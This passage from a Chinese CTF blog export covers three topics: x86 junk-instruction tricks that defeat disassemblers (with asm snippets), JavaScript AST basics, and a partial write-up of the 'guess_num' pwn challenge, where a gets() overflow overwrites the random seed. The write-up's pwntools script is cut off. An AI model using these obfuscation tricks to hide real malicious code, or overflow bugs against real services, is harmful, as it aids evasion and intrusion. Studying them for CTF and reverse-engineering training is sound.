<em>按照代码可能的执行顺序进行反汇编</em><ul><li><u>按照代码可能的执行顺序来反汇编程序</u>。对每条可能的路径进行扫描，当解码出分支指令后，反汇编工具就将这个分支指令的地址记录下来，并分别反汇编各个分支中的指令，可以避免将代码中的数据作为指令来解码</li><li>例如：两个 <code>jz</code> 、<code>jnz</code> 跳转，一个指向无效数据，一个指向正常数据来干扰递归扫描算法</li></ul></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_%E8%8A%B1%E6%8C%87%E4%BB%A42.png" alt="CTF - Reverse_花指令2.png"></p><hr><h2 id="IDA-中的花指令"><a href="#IDA-中的花指令" class="headerlink" title="IDA 中的花指令"></a>IDA 中的花指令</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_%E8%8A%B1%E6%8C%87%E4%BB%A43.png" alt="CTF - Reverse_花指令3.png"></p><hr><h1 id="可执行的花指令"><a href="#可执行的花指令" class="headerlink" title="可执行的花指令"></a>可执行的花指令</h1><blockquote><p>能够正常运行但又不改变原始程序逻辑性的一组无用指令，它们运行完后不会改变原来程序的堆栈、寄存器，但能起到干扰静态分析的作用</p><p>这类花指令有如下特点：</p><ol><li>可以正常运行</li><li>不改变任何寄存器的值</li><li>反汇编器可以正确反汇编该指令</li></ol><p>一般分两种：</p><ol><li>改变堆栈操作</li><li>利用 <code>call 指令</code> 或 <code>jmp 指令</code> 增加执行流程的复杂度【<code>call</code> 指令的硬指令为 0E8h，<mark>E8 表示执行，90 表示跳过</mark>】</li></ol></blockquote><ul><li><strong>示例：</strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_asm <span class="token punctuation">&#123;</span>push eax<span class="token punctuation">;</span>add esp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 32位 下，<code>push eax</code> 分为两个步骤：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span>     <span class="token comment">// 修改堆栈指针 ESP (压入时自动减 4)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>esp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>eax<span class="token punctuation">)</span>     <span class="token comment">// 将指定的操作数送入新的栈顶位置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>正常情况下，push 操作需要对应一个 pop 操作来保持堆栈的平衡</strong><br>在 32位 下，<code>pop eax</code> 分为两个步骤：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span>eax<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>esp<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment">// 将栈顶位置送入指定的操作数</span><span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span>     <span class="token comment">// 修改堆栈指针 ESP (退出时自动加 4)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>后面跟着的 <code>add esp, 4</code> 起到了 pop 指令的部分功能，也就是恢复了堆栈的平衡，使得程序能够正常运行</strong>  </p><p><strong>但在 IDA 中却无法正常识别这种操作，所以 IDA 进行解析时会认为该函数堆栈不平衡，从而使 F5 功能失效</strong>  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_%E8%8A%B1%E6%8C%87%E4%BB%A44.png" alt="CTF - Reverse_花指令4.png"></p><hr><h1 id="不可执行的花指令"><a href="#不可执行的花指令" class="headerlink" title="不可执行的花指令"></a>不可执行的花指令</h1><blockquote><p>花指令虽然被插入到了正常代码的中间，但是并不意味着它一定会得到执行。</p><p>这类不可执行的花指令通常形式为：<mark>在代码中出现了类似数据的代码，或者 IDA 反汇编后为 JUMPOUT(xxxxx)</mark></p><p>这类花指令一般不属于 CPU 可识别的操作码，那么就需要在上面用跳转跳过这些花指令才能保证程序的正常运行</p></blockquote><ul><li><strong>示例 1：</strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_asm <span class="token punctuation">&#123;</span>xor eax<span class="token punctuation">,</span> eax<span class="token punctuation">;</span>jz s<span class="token punctuation">;</span>_emit <span class="token number">0x11</span><span class="token punctuation">;</span>   <span class="token comment">// _emit 指令为：插入字节码</span>_emit <span class="token number">0x22</span><span class="token punctuation">;</span>_emit <span class="token number">0x33</span><span class="token punctuation">;</span>   <span class="token comment">// 0x33是 xor 指令的操作码，会导致后面正常的 Push 指令被错误解析</span>s<span class="token operator">:</span><span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于经过 <code>xor eax, eax</code> 后，ZF 标志位被置为 1，那么 jz 这条跳转指令必定会被执行，后面插入的 <code>0x11</code>，<code>0x22</code>，<code>0x33</code> 就会被跳过，程序正常输出： <code>Hello World!</code>  </p><p>但是在 IDA 中，IDA 已经无法正确解析这段代码：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump2.png" alt="NSSCTF-jump_by_jump2.png"></p><ul><li><strong>示例 2：</strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_asm <span class="token punctuation">&#123;</span>xor eax<span class="token punctuation">,</span> eax<span class="token punctuation">;</span>jz s<span class="token punctuation">;</span>add esp<span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>插入的花指令也可以是改变堆栈平衡的汇编代码，虽然这里的花指令不会被执行，但是 IDA 进行解析时会认为该函数堆栈不平衡，从而使 <code>F5</code> 功能失效</p><hr><h1 id="花指令的实现方式"><a href="#花指令的实现方式" class="headerlink" title="花指令的实现方式"></a>花指令的实现方式</h1><h2 id="简单jmp"><a href="#简单jmp" class="headerlink" title="简单jmp"></a>简单jmp</h2><ul><li>这是最简单的花指令。OD 能被骗过去，但是因为 IDA 采用的是递归扫描法，所以能够正常识别</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">__asm<span class="token punctuation">&#123;</span>jmp label1db junkcodelabel1<span class="token operator">:</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="多层跳转"><a href="#多层跳转" class="headerlink" title="多层跳转"></a>多层跳转</h2><ul><li>本质上和简单跳转是一样的，只是加了几层跳转。无法干扰 IDA</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">start<span class="token operator">:</span>   <span class="token comment">//花指令开始</span>    jmp label1    DB junkcodelabel1<span class="token operator">:</span>     jmp label2     DB junkcodelabel2：    jmp label3    DB junkcodelabel3   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="jnx-和-jx-条件跳转"><a href="#jnx-和-jx-条件跳转" class="headerlink" title="jnx 和 jx 条件跳转"></a>jnx 和 jx 条件跳转</h2><ul><li>利用 jz 和 jnz 的互补条件跳转指令来代替 jmp。无法干扰吾爱破解版 OllyDBG，但 IDA 不能正常识别</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">_asm<span class="token punctuation">&#123;</span>    jz label1    jnz label1    db junkcodelabel1<span class="token operator">:</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="永真条件跳转"><a href="#永真条件跳转" class="headerlink" title="永真条件跳转"></a>永真条件跳转</h2><ul><li>通过设置永真或永假的条件，导致程序一定会执行。也可以调用某些会返回确定值的函数，来达到构造永真或永假条件。这种方式 IDA 和 OD 都无法正常识别</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">__asm<span class="token punctuation">&#123;</span>    push ebx    xor ebx<span class="token punctuation">,</span>ebx    test ebx<span class="token punctuation">,</span>ebx    jnz label1    jz label2label1<span class="token operator">:</span>    _emit junkcodelabel2<span class="token operator">:</span>   pop ebx   <span class="token comment">//需要恢复ebx寄存器    </span><span class="token punctuation">&#125;</span>__asm<span class="token punctuation">&#123;</span>clcjnz label1<span class="token operator">:</span>_emit junkcodelabel1<span class="token operator">:</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="call-amp-ret-构造花指令"><a href="#call-amp-ret-构造花指令" class="headerlink" title="call &amp; ret 构造花指令"></a>call &amp; ret 构造花指令</h2><ul><li>利用 call 和 ret，在函数中修改返回地址，达到跳过 thunkcode 到正常流程的目的。可以干扰 IDA 的正常识别</li></ul><blockquote><p><code>call 指令</code>：将下一条指令地址压入栈，再跳转执行<br><code>ret 指令</code>：将保存的地址取出，跳转执行</p></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c">__asm<span class="token punctuation">&#123;</span>    call label1    _emit junkcodelabel1<span class="token operator">:</span>    add dword ptr ss<span class="token operator">:</span><span class="token punctuation">[</span>esp<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">8</span>   <span class="token comment">//具体增加多少根据调试来</span>    ret    _emit junkcode<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="汇编指令共用-opcode"><a href="#汇编指令共用-opcode" class="headerlink" title="汇编指令共用 opcode"></a>汇编指令共用 opcode</h2><ul><li>jmp 的指令是 <code>inc eax</code> 的第一个字节，<code>inc eax</code> 和 <code>dec eax</code> 抵消影响。这种共用 opcode 的方法比较麻烦</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_%E8%8A%B1%E6%8C%87%E4%BB%A45.png" alt="CTF - Reverse_花指令5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_%E8%8A%B1%E6%8C%87%E4%BB%A46.png" alt="CTF - Reverse_花指令6.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS逆向</title>
      <link href="/posts/debddada.html"/>
      <url>/posts/debddada.html</url>
      
        <content type="html"><![CDATA[<h1 id="抽象语法树-AST"><a href="#抽象语法树-AST" class="headerlink" title="抽象语法树 AST"></a>抽象语法树 AST</h1><blockquote><p>源代码的抽象语法结构的树状表示，树上的每个节点都表示源代码中的一种结构</p><p>抽象表示把 js 代码进行了结构化的转化，转化为一种数据结构。这种数据结构其实就是一个大的 json 对象</p><p>简单理解，就是<strong>把代码按照一定的规则转换成一种树形结构</strong></p></blockquote><hr><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><ol><li>一组简单的 AST 树状结构，转换前：</li></ol><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> team <span class="token operator">=</span> <span class="token string">'我是一个示例'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>转换后：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Program"</span><span class="token punctuation">,</span>  <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>  <span class="token string-property property">"body"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"VariableDeclaration"</span><span class="token punctuation">,</span>      <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>      <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>      <span class="token string-property property">"declarations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>          <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"VariableDeclarator"</span><span class="token punctuation">,</span>          <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span>          <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>          <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span>            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>            <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"team"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token string-property property">"init"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Literal"</span><span class="token punctuation">,</span>            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">11</span><span class="token punctuation">,</span>            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>            <span class="token string-property property">"value"</span><span class="token operator">:</span> <span class="token string">"我是一个示例"</span><span class="token punctuation">,</span>            <span class="token string-property property">"raw"</span><span class="token operator">:</span> <span class="token string">"'我是一个示例'"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string-property property">"kind"</span><span class="token operator">:</span> <span class="token string">"const"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string-property property">"sourceType"</span><span class="token operator">:</span> <span class="token string">"module"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>拆解一个简单的 add 函数，转换前：</li></ol><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>转换后：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Program"</span><span class="token punctuation">,</span>  <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">38</span><span class="token punctuation">,</span>  <span class="token string-property property">"body"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"FunctionDeclaration"</span><span class="token punctuation">,</span>      <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>      <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">38</span><span class="token punctuation">,</span>      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>        <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"add"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token string-property property">"expression"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token string-property property">"generator"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token string-property property">"async"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token string-property property">"params"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>          <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>          <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">13</span><span class="token punctuation">,</span>          <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">14</span><span class="token punctuation">,</span>          <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"a"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>          <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>          <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">16</span><span class="token punctuation">,</span>          <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">17</span><span class="token punctuation">,</span>          <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"b"</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string-property property">"body"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"BlockStatement"</span><span class="token punctuation">,</span>        <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">19</span><span class="token punctuation">,</span>        <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">38</span><span class="token punctuation">,</span>        <span class="token string-property property">"body"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"ReturnStatement"</span><span class="token punctuation">,</span>            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">24</span><span class="token punctuation">,</span>            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">36</span><span class="token punctuation">,</span>            <span class="token string-property property">"argument"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"BinaryExpression"</span><span class="token punctuation">,</span>              <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">31</span><span class="token punctuation">,</span>              <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">36</span><span class="token punctuation">,</span>              <span class="token string-property property">"left"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>                <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">31</span><span class="token punctuation">,</span>                <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">32</span><span class="token punctuation">,</span>                <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"a"</span>              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>              <span class="token string-property property">"operator"</span><span class="token operator">:</span> <span class="token string">"+"</span><span class="token punctuation">,</span>              <span class="token string-property property">"right"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>                <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">35</span><span class="token punctuation">,</span>                <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">36</span><span class="token punctuation">,</span>                <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"b"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string-property property">"sourceType"</span><span class="token operator">:</span> <span class="token string">"module"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="生成抽象语法树"><a href="#生成抽象语法树" class="headerlink" title="生成抽象语法树"></a>生成抽象语法树</h2><ul><li>在线网站：<a href="https://astexplorer.net/">AST explorer</a></li></ul><hr><h1 id="语法树还原成代码"><a href="#语法树还原成代码" class="headerlink" title="语法树还原成代码"></a>语法树还原成代码</h1><blockquote><p>用 <code>escodegen</code> 将 JavaScript AST 转化为代码</p></blockquote><ol><li>使用 npm 命令安装 escodegen 模块：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i escodegen <span class="token parameter variable">-g</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>使用 escodegen 将 js 语句的 AST 语法树 —— json 文件转化成 js 代码：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">esgenerate json文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><ul><li>得到的 js 代码可以直接 F12 后在浏览器的控制台中运行</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_JS%E9%80%86%E5%90%911.png" alt="CTF - REVERSE_JS逆向1.png"></p><ul><li>使用 nodejs 来运行</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">node</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】guess_num</title>
      <link href="/posts/8bed15c9.html"/>
      <url>/posts/8bed15c9.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>栈溢出漏洞</mark></p></li><li><p>通过 <mark>Python 实现 C 语言函数的运行</mark>，利用 <code>ctypes</code> 库和 <code>cdll.LoadLibrary(&quot;libc.so.6&quot;)</code></p></li><li><p>通过<mark>编写脚本来 PWN 通程序中函数的逻辑</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/b59204f56a0545e8a22f8518e749f19f">【攻防世界】guess_num</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看文件信息：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num1.png" alt="攻防世界-guess_num1.png"></p><p>64位 小端序，金丝雀、栈不可执行、地址随机化全都开启</p><p>尝试执行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num2.png" alt="攻防世界-guess_num2.png"></p><p>打开 IDA 分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num3.png" alt="攻防世界-guess_num3.png"></p><p>发现随机数种子 <code>seed</code>，且存在 <code>gets()</code> 这种明显的漏洞函数</p><p>函数 <code>sub_BB0()</code> 用来生成随机数种子：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num4.png" alt="攻防世界-guess_num4.png"></p><p>在 <code>puts(&quot;Success!&quot;)</code> 后执行了函数 <code>sub_C3E()</code> 跟进：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num5.png" alt="攻防世界-guess_num5.png"></p><p>该函数会执行 <code>system(&quot;cat flag&quot;)</code>，说明只要让这个函数执行就可以得到 flag，即：保持 <code>for</code> 循环不会中途退出</p><p>分析 <code>for</code> 循环的逻辑：<br>总共循环 10 次，并且每次循环会根据 <code>v6 = rand() % 6 + 1</code> 生成一个随机数 <code>v6</code>，然后让用户输入一个 <code>v4</code>，只有当 <code>v4 == v6</code> 才能让循环继续下去</p><p>观察栈中数据的位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num6.png" alt="攻防世界-guess_num6.png"></p><p><mark>发现用户输入的 <code>v7</code> 在随机数种子 <code>seed</code> 的上方，而且用户的输入在函数 <code>sub_BB0()</code> 生成随机数种子的操作之后，因此可以通过将 <code>v7</code> 溢出从而修改随机数种子 <code>seed</code> 的值</mark></p><p>这样就可以得到 <code>v6 = rand() % 6 + 1</code> 所产生的所有伪随机数，之后编写脚本将所有产生的 <code>v6</code> 作为输入发送过去，就可以实现猜中所有的随机数了</p><blockquote><p><strong>注意，在 Python 中，可以通过 <code>from ctypes import *</code> 引入 C 语言库，用 <code>lib = cdll.LoadLibrary(&quot;libc.so.6&quot;)</code> 导入 C 运行库，就可以使用 <code>lib</code> 来执行 C 语言的函数了</strong></p></blockquote><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">global</span> io<span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> io    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 根据ida的伪代码，先将种子设为1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        number 